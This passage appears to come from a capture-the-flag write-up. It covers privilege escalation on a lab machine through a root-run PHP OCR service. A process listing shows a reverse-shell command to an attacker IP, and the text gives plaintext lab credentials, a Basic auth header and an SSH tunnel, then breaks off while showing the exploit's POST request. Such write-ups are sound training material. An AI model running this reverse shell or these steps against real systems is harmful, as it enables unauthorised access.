root          97  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/u5:0]
root         112  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-charg]
root         139  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/0:1H]
root         178  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_2]
root         180  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         181  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_3]
root         182  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         183  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_4]
root         184  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         185  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_5]
root         186  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         187  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_6]
root         188  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         189  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_7]
root         190  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         191  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_8]
root         192  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         193  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_9]
root         194  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         195  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_10]
root         196  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         197  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_11]
root         198  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         199  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_12]
root         200  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         201  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_13]
root         202  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         203  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_14]
root         204  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         205  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_15]
root         206  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         207  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_16]
root         208  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         209  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_17]
root         210  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         211  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_18]
root         212  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         213  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_19]
root         214  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         215  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_20]
root         216  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         217  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_21]
root         218  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         219  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_22]
root         220  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         221  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_23]
root         222  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         223  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_24]
root         224  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         225  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_25]
root         226  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         227  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_26]
root         228  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         229  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_27]
root         230  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         231  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_28]
root         232  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         233  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_29]
root         234  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         235  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_30]
root         236  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         237  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_31]
root         238  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root         291  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-raid5]
root         329  0.0  0.0      0     0 ?        S    19:09   0:08 [jbd2/sda4-8]
root         330  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-ext4-]
root         377  0.0  0.3  50440 15344 ?        S<s  19:09   0:00 /usr/lib/systemd/systemd-journald
root         434  0.0  0.2  29912  8660 ?        Ss   19:09   0:00 /usr/lib/systemd/systemd-udevd
root         441  0.0  0.0      0     0 ?        S    19:09   0:00 [psimon]
root         512  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/60-vmw_vmci]
root         513  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/61-vmw_vmci]
root         514  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/62-vmw_vmci]
root         544  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/16-vmwgfx]
root         545  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-ttm]
root         565  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-crypt]
root         634  0.0  0.0      0     0 ?        S    19:09   0:00 [jbd2/sda2-8]
root         635  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-ext4-]
systemd+     683  0.0  0.3  21584 12988 ?        Ss   19:09   0:00 /usr/lib/systemd/systemd-resolved
systemd+     688  0.0  0.1  91028  7832 ?        Ssl  19:09   0:02 /usr/lib/systemd/systemd-timesyncd
root         695  0.5  0.0  85380  2804 ?        R<sl 19:09   0:49 /sbin/auditd
_laurel      700  0.4  0.1  10584  7008 ?        S<   19:09   0:38 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         752  0.0  0.0      0     0 ?        S    19:09   0:00 [audit_prune_tree]
root         820  0.0  0.2  53468 11980 ?        Ss   19:09   0:00 /usr/bin/VGAuthService
root         825  0.1  0.2 317208 10700 ?        Ssl  19:09   0:16 /usr/bin/vmtoolsd
root         832  0.0  0.0   3940  3244 ?        Ss   19:09   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+     871  0.0  0.1   9808  5464 ?        Ss   19:09   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
polkitd      920  0.0  0.1 308164  7980 ?        Ssl  19:09   0:00 /usr/lib/polkit-1/polkitd --no-debug
root         938  0.0  0.2  18196  8812 ?        Ss   19:09   0:00 /usr/lib/systemd/systemd-logind
root         940  0.0  0.3 468988 13588 ?        Ssl  19:09   0:00 /usr/libexec/udisks2/udisksd
syslog       967  0.0  0.1 222508  6568 ?        Ssl  19:09   0:00 /usr/sbin/rsyslogd -n -iNONE
root        1031  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/0:2H-kblockd]
root        1082  0.0  0.3 392096 12744 ?        Ssl  19:09   0:00 /usr/sbin/ModemManager
root        1281  0.0  0.0   6824  2860 ?        Ss   19:09   0:00 /usr/sbin/cron -f -P
root        1325  0.0  0.0   9540  3836 ?        S    19:09   0:00 /usr/sbin/CRON -f -P
root        1361  0.0  0.0   2800  1812 ?        Ss   19:09   0:00 /bin/sh -c /root/.scripts/start_ocr4.sh
root        1362  0.1  0.0   7340  3584 ?        S    19:09   0:09 /bin/bash /root/.scripts/start_ocr4.sh
root        1396  0.0  0.0   6104  1988 tty1     Ss+  19:09   0:00 /sbin/agetty -o -p -- \u --noclear - linux
root        1398  0.0  0.7 228488 30304 ?        S    19:09   0:01 php -S 127.0.0.1:8001 -t /root/ocr4/
root        1410  0.0  0.7 232504 31684 ?        Ss   19:09   0:03 /usr/sbin/apache2 -k start
root        1590  0.0  0.2 314008  9080 ?        Ssl  19:10   0:00 /usr/libexec/upowerd
root       10070  0.0  0.0      0     0 ?        I    19:42   0:01 [kworker/u4:2-events_power_efficient]
root       16754  0.0  0.0      0     0 ?        I    20:08   0:00 [kworker/1:0-cgroup_release]
root       19633  0.2  0.0      0     0 ?        I    20:20   0:11 [kworker/1:2-mm_percpu_wq]
www-data   27153  0.0  1.5 310888 60232 ?        S    20:49   0:00 /usr/sbin/apache2 -k start
www-data   29044  0.0  0.0   2800  1812 ?        S    20:56   0:00 sh -c -- bash -c "bash -i >& /dev/tcp/10.10.15.169/443 0>&1"
www-data   29045  0.0  0.0   4324  3340 ?        S    20:56   0:00 bash -c bash -i >& /dev/tcp/10.10.15.169/443 0>&1
www-data   29046  0.0  0.0   4588  3936 ?        S    20:56   0:00 bash -i
www-data   33606  0.0  0.0   2716  1816 ?        S    21:14   0:00 script /dev/null -c bash
www-data   33607  0.0  0.0   2800  1808 pts/0    Ss   21:14   0:00 sh -c bash
www-data   33608  0.0  0.0   4588  3968 pts/0    S    21:14   0:00 bash
root       36587  0.0  0.0      0     0 ?        I    21:26   0:00 [kworker/u4:3-ext4-rsv-conversion]
www-data   37599  0.2  1.4 310912 60104 ?        S    21:30   0:02 /usr/sbin/apache2 -k start
root       37617  0.0  0.0      0     0 ?        I    21:30   0:00 [kworker/u4:4-flush-8:0]
www-data   37854  0.1  1.4 308420 57736 ?        S    21:31   0:01 /usr/sbin/apache2 -k start
root       37958  0.0  0.1   6776  4564 pts/0    S    21:31   0:00 su - walter
root       37972  0.0  0.0      0     0 ?        S    21:31   0:00 [psimon]
walter     37974  0.0  0.2  20168 11192 ?        Ss   21:31   0:00 /usr/lib/systemd/systemd --user
walter     37976  0.0  0.0  21156  3580 ?        S    21:31   0:00 (sd-pam)
walter     37989  0.0  0.1   8636  5500 pts/0    S+   21:31   0:00 -bash
www-data   38140  0.1  1.4 308376 57048 ?        S    21:32   0:01 /usr/sbin/apache2 -k start
www-data   38145  0.3  1.5 310908 60196 ?        S    21:32   0:02 /usr/sbin/apache2 -k start
root       38215  0.0  0.2  12024  8212 ?        Ss   21:32   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root       38217  0.0  0.2  14964 10532 ?        Ss   21:32   0:00 sshd: walter [priv]
walter     38319  0.0  0.1  15124  7080 ?        S    21:32   0:00 sshd: walter@pts/1
walter     38322  0.0  0.1   8672  5684 pts/1    Ss   21:32   0:00 -bash
www-data   39574  0.3  1.4 308304 57552 ?        S    21:37   0:01 /usr/sbin/apache2 -k start
www-data   39829  0.1  1.4 236496 57364 ?        S    21:38   0:00 /usr/sbin/apache2 -k start
root       39848  0.0  0.0      0     0 ?        I    21:38   0:00 [kworker/u4:6-flush-8:0]
root       40018  0.1  0.0      0     0 ?        I    21:39   0:00 [kworker/0:1-events]
www-data   40135  0.2  1.4 310528 59296 ?        S    21:39   0:00 /usr/sbin/apache2 -k start
www-data   40894  0.0  0.6 233428 27864 ?        S    21:42   0:00 /usr/sbin/apache2 -k start
www-data   41141  0.0  0.4 233212 19008 ?        S    21:43   0:00 /usr/sbin/apache2 -k start
www-data   41388  0.0  0.3 233196 14656 ?        S    21:44   0:00 /usr/sbin/apache2 -k start
root       41453  0.0  0.0   5684  2064 ?        S    21:44   0:00 sleep 1
walter     41454  0.0  0.1  10884  4536 pts/1    R+   21:44   0:00 ps auxww
```

There’s a raw PHP server running in `/root/ocr4/` as root:

```
root        1398  0.0  0.7 228488 30304 ?        S    19:09   0:01 php -S 127.0.0.1:8001 -t /root/ocr4/
```

Trying to access it asks for auth:

```yaml
walter@makesense:~$ curl localhost:8001
Authentication required.
walter@makesense:~$ curl localhost:8001 -I
HTTP/1.0 401 Unauthorized
Host: localhost:8001
Date: Tue, 20 Oct 2026 21:46:43 GMT
Connection: close
X-Powered-By: PHP/8.3.6
Set-Cookie: PHPSESSID=eot6reqk5k5mbaer2qkdtg1ki5; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
WWW-Authenticate: Basic realm="OCR Protected"
Content-type: text/html; charset=UTF-8
```

#### OCR4 - TCP 8001

I’ll reconnect my SSH session with `-L 8001:localhost:8001` to get a tunnel to this localhost webserver. Visiting `localhost:8001` in my browser asks for auth:

![image-20261020174759785](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f4b5febd199103ad.png)

![image-20261020174759785](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020174759785.webp)

The creds walter / “JbhHDAEgXvri3!” work to get access:

![image-20261020174842226](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/357f77add514587f.png)

![image-20261020174842226](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020174842226.webp)

I can draw something in the box:

![image-20261020174949417](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/317f0cd5d838f805.png)

![image-20261020174949417](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020174949417.webp)

On submitting, it returns what it thinks it found (hard to blame the site for not nailing that input):

![image-20261020174956655](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0140000571b172c2.png)

![image-20261020174956655](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020174956655.webp)

I can give it a file name and click save, and it saves it, presumably in `/root/ocr4/saved` (the server’s web root observed in the process list):

![image-20261020180029714](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b90ba71226238bdc.png)

![image-20261020180029714](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020180029714.webp)

I can’t access the file in `/root`, but I can fetch it over the webserver:

```
walter@makesense:~$ curl http://localhost:8001/saved/test.txt
IA: \
```

A few tests show that it has no issue overwriting files. It doesn’t seem vulnerable to directory traversal.

### Exploit

#### POSTs

The flow from drawing to saved file takes place over two POST requests. The first is the image sent as a data URL:

```powershell
POST / HTTP/1.1
Host: localhost:8001
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 11781
Origin: http://localhost:8001
Authorization: Basic d2FsdGVyOkpiaEhEQUVnWHZyaTMh
Connection: keep-alive
Referer: http://localhost:8001/
Cookie: lang=en-US; username-localhost-8888="2|1:0|10:1790362479|23:username-localhost-8888|192:eyJ1c2VybmFtZSI6ICJkMTJkOThhM2M3MTY0MTUyYjQwYjAyZjhhNTU2MzU5YyIsICJuYW1lIjogIkFub255bW91cyBDYXJtZSIsICJkaXNwbGF5X25hbWUiOiAiQW5vbnltb3VzIENhcm1lIiwgImluaXRpYWxzIjogIkFDIiwgImNvbG9yIjogbnVsbH0=|8cb52a349a5929af9bb334c9483f006f1e1471e19dda498c70ad2dc4e55df48a"; PHPSESSID=kh703rsfk2dgln9808vnsfvceu

canvas_image=data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAAfQAAADICAYAAAAeGRPoAAAfxUlEQVR4Xu3dC7AsR30e8O55dE8vQrwiI4NkLAQy4hVIASaxKdtgKxa4nFBAQeyExMaBYBMeBY4rCBFMbOQE4ohyjIwf5cSyLUKIRQpbWEWwSQQOBhMjZB5GWBJ6xshcPe69Oz09j079j2Zau312z9lzzu6emZ7vV3VLbK%2FE3Zmd7W%2F6OZwBAADA4PHBHwEAAAAg0AEAAEKAFjoAAEAAEOgAAAABQKADAAAEAIEOAAAQAAQ6AABAABDoAAAAAUCgAwAABACBDgAAEAAEOgAAQAAQ6AAAAAFAoAMAAAQAgQ4AABAABDoAAEAAEOgAAAABQKADAAAEAIEOAAAQAAQ6AABAABDoAAAAAUCgAwAABACBDgAAEAAEOgAAQAAQ6AAAAAFAoAMAAAQAgQ4AABAABDoAAEAAEOgAAAABQKADAAAEAIEOAAAQAAQ6AABAABDoAAAAAUCgAwAABACBDgAAEAAEOgAAQAAQ6AAAAAFAoAMAAAQAgQ4AABAABDoAAEAAEOgAAAABQKADAAAEAIEOAAAQAAQ6AABAABDosBDnvEiSJHEFraqqSmtt5goAAKAXEOiwQ0pZc84jzh%2B4JLp%2FLmKtdf%2B01jbGGIQ8AMAxW15rwyhwzvMsy7K9AnwVC0LeWGtV%2BzYAAGzY0WpxGDwpZRPH8UauA4Q8AMD2bKQih%2BHIssxGUbTwA3eBPGtdLXlSlmVTVZVmjD3EFQIAwKEcrXaGwZsN9La7nNV1XZdleQ1j7IcXHOBn0zR9ZhRFNN5O1hLy9IdzbpumsUVRnGSMPdz9CwAAsK%2Bj1cQweH4Lva5rCtTFTfblbkjT9MLZkCeHDfou4K21tp1wJ92bAACw0OFqXAjGmgJ9kRuSJHkyjc93IX%2FUgC%2BKorLWpu4NAABwDlfDQjA2GOiLfDVJkvNnQ54cJOi7cG%2BHBV7GGLvavQkAMGKr16QQpC0H%2BiI3JUnyuMO05CnYSdM0TVEUFOwvbd8CABid1WpOCJYf6E3TMK31sV4XSZLUSZLsbHJzkHBv%2F1C4x%2B4NAICRWK22hGAJIZokSdx10IdAn8U5L4UQO833ZcvrFvEC%2Fi7G2DnuTQCAACHQ4ebJZPLts6fBGEPrw%2FvYyr1LCPHodjL9yq134gX8XzHGLnBvAgAEYPUaEYLld7tT8OV53vdr41Vpmv5qHMcH6pondHyEJgAaY76GcAeAEKxeC0KwaMxaCOESvQ30axljPziUg6anw0kpxUHDndDxtuG%2Bep8%2BAEDPHKzmg1C9XCn1gdkgrKpqsAHHOddpmgrqmqdjWTXkaSMbWg5njMFadwAYnP1rORiFgXa7ryxN06rbyW6%2FyXU0MbAoigLPfQeAIUGgw44kSWg2eTJ7OqbT6WnG2BmuIBDUPS%2BESPcK924Sndb6y4yxJ7s3AAB6CoEOjlLKznZN04NStNaLEy8Q3dj7XsGe5zlNnHuiKwQA6CEEOjj%2Bs9H7tiZ9k6IoKqWUyaKx9vY8fJUx9h2uEACgZ3bXXjBmpyaTydyzycuypD3T57riQ%2BbPJei0LXX8XgCgt1BBwRy%2F232MQUaz5LMsk35rPc9zepSrcAUAAD2CQIc5S9ak%2Fw1j7KyubCz8m5s8z%2FH4VgDoLQQ67OIH2YYfqdpb%2FnlAoANAnyHQYRd%2FctwYu90JAh0AhmTsgf7LUsrXWmvvMMacO6QvbsMWTY5ryrLs4wNbNkJKaeN4%2FnDRQgeAPhtzoE%2ByLDvdzWiuqqoxxowmsPbjz%2FYe0xI2%2F9jJWHspAGA4RhvoSZLcL4R4aPdVjSmwVkFbpaZpOneDM51Op4yxuZZ7SIQQZRzHu9aiU5hrrTEhDgB6bbSBLoSokyRxzTAE%2Bm7%2BGHLIk%2BP8eQMdhDkADMWuCmws%2FG5VBPpuWZY13RPLCD2NLM%2FzZzLGru%2FKhq5tlce0r7t%2FLHS8VVVVZVli7TkA9N6uSmws%2FNYnxtAX%2BppS6nyvld4URRHCXIO7lFJnL8jxHXSDVxQFNpIBgMFYXJuNgB%2FoxpjTVVUF92Sxo%2FJne4cwOUwIsdO9vizMQx5agF55W5qmb%2BecJ%2B1vbNcFSddiWZY0f%2BNRjLGT7g2ABXZdQGPhB3qe55%2B31lJ3MsxI07RM03RuL3ettWmaRrqCgZBS1u0z0Rd%2B4rZVbqy1gzs26L80TYs4jkV3%2FS27Dpeh65NuqI0xuEZhoYNdUeHgSqlm9gc1nU5fyBj7qCsAZ%2BjzDfYLcqokaZ19VVUhDCVA%2F7xBSnm5v6%2FBURhjcL3CLotruMBFUfRbWZb9k%2B4wQ%2BhG3iTqok6SxF0r7fl6FmPsc11ZH%2B3XtU7w3cMm0fLPJEnoInRl64BhIVhkvVfZQAgh7kqS5Ozu46JS39crlFJXzVZKVVVZY0wv93fnnO8829zfHGZW270%2BtdYGu64ejtUbsiy7fK9rkFDd0%2F3TD%2F3uPSr338vz%2FKS19kxXADDWQJdS7oxldVcAlqztbyDd7h%2FKsuwle1WibZDfY619pCsEWKM0TU2SJKkfwoRCumka2zQNbaV8NWPsZe7N5ej%2F62Sapjvj78aYwlqr3LsArd1X3Aj4m4gg0PfHOS%2BUUnPrscuyrMuynJswd1zosa%2B0UdCyMK%2FrmipCBDlslJSyaudr7Kpb23rmfzLGfsAVAqzRrotuDPzWJsajVuOvDOjDUAXn%2FJtSykcuC3L6jFprjRYNbJrfUOjQNYhJl7ANuy6%2BMVgQ6KYoCixV2ge1goUQc8l5XLNtOef3SynPoJbQgsbQTmuIujb7Os4PYfFvdjttqzxjjBWuEGBDdl%2BBI%2BD%2F%2BKqquh2PT12Nf%2B7aVvpTGGNfcoUb0s0Ypr9zWYuctJXobzPG3EoGgA35FaXUq%2F27Sto2mGit17dWDWAfCPQH1qC%2FlzH2xu6kwHKLNpqhlrDWennCroF%2FI7FI272OTTdgK%2BI4%2FroQ4txFYV7XdWmMQa8fbNXeNWSYLp5MJtd0h9aHceCh8cO1PYd3MsYe6wrXiDaGieN46Q0D%2Ff3W2gatIdgWIQStlKHZ57vC3BhzW13Xj3OFAFsyukDnnP%2B5UuoZ3flFoB8c53yaZZmarcs2uVLAn%2FOwDH2X7dg5zb7%2FDGPs77k3AdbE32ip09Ylv8UY%2B6euEGCLdl2UoUuS5F4hxMO640SgH86ikKV90Ou6Xns3I42dp2l64LHItuVOf%2BgJcZ9gjL3AvQlwCJzzE1mWPcIf%2FmnrkZSm5LhCgC0bXaALIXSSJC50NtmyDNxOT8e2Wum0%2B5sQIu6ez04VKP3dfsW6FwQ8HNGlSql3%2Btcclr1CX6xeGwYiy7KdB3V0h0MbjhRFMbrzsA6Luh6rqqqNMVvbbEYIUUZRtPP3%2BT0G%2B%2BkCvqoqPOgC9rWoV6qua%2Br9OXDvEcAmjC7I%2FM0fDtpCF0LcFkXROTT5pV27Xro3x%2BdblVJ3bquVvp8oimgG%2Fs7TWA7beq9penJPdr%2BD%2FvDrDXLQugNg00Z3Mfp32QfpLovj%2BMNCiB%2FuZrZSqOd5vtJ%2FG6pFM9D78uCWrpv%2BoAFPwd5uSvNNa%2B1Z7g0YJRqma59j7i6g9rf%2FCMbYfaM8KdBLq9VwAfGXXFVVVRljaDLLvtI0PZGmKf2InYPcEITKP6dtZffxnu1ZTfVxIYRIDhLw1AqjQ9Ja%2FzEm1Y3SB5VSL10Q5jTJ8vmjPCPQW%2FvXaIHxw6eu62lRFCs%2FQtP%2F70lZlneXZfktrmBkkiQxQoi5m6Ih3OjQ7Pkoimii3Urh3nbJU8v9Zxhj73ZvQKgeppS6xw%2FzpmmqoijmHlQE0Af712KB8bvcq6q60xiz8oYoSZL8rzRNn%2Bf%2FyPM8fx9j7HVd2dhIKW0cPzg3iMIvz%2FPTjLEzXGGP0dAB53zp09pm0bERPHAjbH5dQTBuDn02ukD3W9h5nv%2Bptfa5rmAFUsrTcRxPXMGDof5oxtjdrnBc7lNKnen1fgxxBcGvCSFe1U2A2q%2Fl3o23F0VBG4r8M%2FcGDJoQ4mSSJHM3o22YU8I%2FcEcH0DN711YB8gN9Op2%2BhzH2065gRbh7323RTGBjTFlV1SC7JznntwkhHrvk8dZz2mCn482ttXM3ezA8fj1B36%2FW%2BrPW2ue4QoCe2buWCpD%2FQ51Op4e9436IUuqkX9PXdV0URUGPSxyjdyul3uwNR1AvyOCvM9ruVkqp6Jj8blgfBXs7S%2F57GGPXuTdgEBat3MB6cxiCwVe0B%2FT6yWRCT1bbsYaweYdS6u3%2BeHpVVZ8vy%2FLvdGVjsmizmbIsg1rbTc%2BFT5Jk3%2FF2ur7alt1fMsae5N6APjtHKXWr%2F5se%2B%2FJUGIajhNngcM6vVUpd1H3wNQQ6BdgtcRx%2F24IKgB7QcGVXNib%2BcETAE4m%2BIqW8gL77%2FcKdzgF2pOu%2FLMuabnvhzthXscBwHCnMhkYIcVOSJOd1n3tdQbOoEhjzXT1t6KKUmtv%2BNc%2Fz0lo7yLH0VRyk1d5OovsNxtg%2Fd29AH7xGKXXF7M35uuoIgG0Y1YUqhLgjjuPHdL%2FXdbTQO0qpZrYiIENYi70pI2ql%2B74gpXzqfhPp2mCnSXQnrbVnujfg2PjXLN2Ua60%2FZa19nisE6LHlNU6A%2FMkua777%2FrtKqU%2F5Xe91Xd9rjHlkVzYWaZqaNE3dZjN0Lmi2YNM0OxPLxqBrtdMlsUK400M%2BKDj%2BxL0BW8M5vy7Lsu9C6xyGbHktEyD%2FDryqqsIYs7YZ6XEcf0QI8SI%2F1IuiuKppmh%2FtysbCX1Gwzh6RIeGc3yilfMJ%2BwU43mDSbuixLPL1ry%2Fy6oR0yey1j7P2uEKDnltcuAfIDJs%2Fz6621z3AFayClvD%2BKojP8UM%2Fz%2FCmMsS93ZWNALVQhxNygcp7nU2vtylvtBuZnsyy7lK6NvYKdnvhWFMXWHkE7dpzzrymlzp89DzTPod1EBmAwltcq4blQKfXFribdZMgu2mBlzd37g%2BG3fMZ6HjxcSlkt22qWejKwrez2%2BJNax9qTBMM3moCRUt4Qx%2FFTu69swz9a3k6ScwWkrmtdFMVoxpCJP2%2BhPe%2BD2eN90%2BgJcFJKsSjYjTFNVVXoft8w%2F6ZzzJNZYdg2FWi9I4QokiRxy6a20FJ8o1LqP86GOoVZURRXNk3zSlcYvl03N1s494NDLXZqrvtDNe1kOXS%2Fb5C%2FQiXP83uttXOPSQYYgtEE%2BoK7cKooN9r6SZLkY2mavsCvpMe265S%2Fe1x7Du5hjD2qK4Od3gyE%2BpZxzk8opVx4j%2FH3CeEYTaD7E%2BLqur6%2FKIqHuYINybKs9gdKR9il9%2B1KqZu980%2Bz%2F3f3M4%2Bcf%2FNDqGenqqqgts%2FtC3%2B%2BC3qPYMjGFOh%2Bt9qHrLUv28aX53fpUSugrusvGGPWOsO%2Bz5ZMPPoMY%2Bw7%2B%2Fy5j8OyUN%2FgnI%2FRWnCjjxtNGKyxVBD%2FbjKZ%2FKvuWzqGbrUrlFKv8UM9z3PaSORTXVng3qqU%2BnlUnqtZFOrbGCYaG%2F9mO8%2Fzv7bWnj228wBhGEWgJ0nyDSHEWd1XdhzdalLKk3EcnzF72RzH5zhOfvdm2%2Bq8hDH2ruP8XH3lz%2FsY2%2FWyaWma3pemqdt29xhu9AHWahSBvmTp1NaP3a%2BgCW0NWxTFWGbUflop9Z2zrXRs4LFcHMd3Sim%2F1RU8sJTtvqqqHu4K4ND8G0zcMMHQbT3UjoMfpE3T1Frr41gK9ONKqV9f0PX%2BFsbYL3ZlIfPHLNvjfytj7BdcITj%2B%2BarrmpY%2BjuJ3u2n%2BucXNJQzdKCoG%2F4dbVdWdxpjHuoItklLeGkXROQtCfSwzvu9RSj3c%2Bz6sMWYsx38gS3qXfoox9r6uDA7lO5RSX%2FbGz2%2Bx1rrHKwMMzRgCXSmlTs%2F%2BcKfT6U8yxq44ri%2FL7zEgtCzJGHMcvQZb5x9%2FG1KPZ4zd7ArB8W9IMRP76NI0vTdNU7ds9biG4QDWKfhAj6Lo%2FVLKV%2B8cLOd9GSd7mlLqer%2BVXpblR6uqelFXFirO%2BZTusmaPD6305fyxXoTP0aVpejpN00n3GucUQhB8oAshTiZJ4maX9%2BWHm6bpdUmSzD1%2Fue16P5cxdkdXFioppY3jBzfqa78XarZbVwid90wmkze7Vw%2F0Ml3GGKO5B3A4%2F2UymbgtmNvfHs14P9WVAQxN8IHub2jSp4kvfsuLjGWmbRRFOssy6Q4c66z35He7T6dTmkQ5F%2FJwMAvWoN9orb2gew0wNIMIdKXUmxhjNBP8VsbYG%2FM8%2F9NVT7Q%2FXlvX9TeKoni0KzhmfqVCLYWmaW4viuLbjvmjbZz%2F3YzlZuaA3qGU%2BjezYd6XXqah82%2BS8Bx6GLohBHqmlDrBOd8Zc7XWfjDP85eveOLPUUrd6k2Io5uDy7vXxy2O498VQrzCD%2FU8z1%2FMGPsfx%2F35NolzbpRSqSt4oJVUWmvdU%2FHGzg8d0qdepiHzh30w2RCGrveBLoR4apIkN8yc6C9Op1P3XPO9ZFn26SiK3F7hfW3ZCCFMkiRzwTaW1qrfSsczwB%2B0aEimr9fwEC0YjmNa697XiQDL9P7iPWKg6yiK3Dhtn3%2Bwftc7qes6L4rCzcQNEbXSsyxL6dDRQnpQmqZ5mqaZK0CYr12apqfSNH1I9xo3SzB0QQe6311Z13VVFMVcS7hHXq%2BUeu%2Fs520rmJcyxv67K4TgUcucWo7etWC11p%2By1tIDfWA9Lp9MJm%2FoXmCmOwzdqAK9qqqvGGMu7OuXliTJCSHE3L7uaDWMyt9XSn3U76khVVUVxpi5FjscnX%2FTn%2Bf5bdba4CekQph2VRx9c4Qu9384mUyu7l60d980nv7ZrqyP%2FDFl0n526nrXrhCCwjn%2FZJZltC%2FBruPCpjub4wd6VVWNMebBmXIAA7K79uiZwwZ6mqa3pGn6uO71gFq6351